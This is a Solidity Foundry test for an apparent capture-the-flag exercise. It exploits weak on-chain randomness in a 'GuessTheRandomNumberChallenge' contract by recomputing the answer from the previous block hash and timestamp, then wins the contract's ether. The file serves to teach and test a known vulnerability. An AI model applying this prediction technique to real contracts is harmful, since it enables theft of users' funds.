
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {
    GuessTheRandomNumberChallenge challenge;

    function setUp() public {
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber, uint256 blockTimestamp) public {
        vm.assume(blockNumber >= 1);
        vm.assume(blockNumber < block.number + 256);
        vm.assume(blockTimestamp <= type(uint64).max);

        uint256 initialBalance = address(this).balance;
        vm.deal(address(this), 2 ether);

        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        bytes32 previousBlockHash = blockhash(blockNumber - 1);
        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(previousBlockHash, blockTimestamp))));

        challenge.guess{value: 1 ether}(predictedAnswer);

        assert(challenge.isComplete());
    }
}
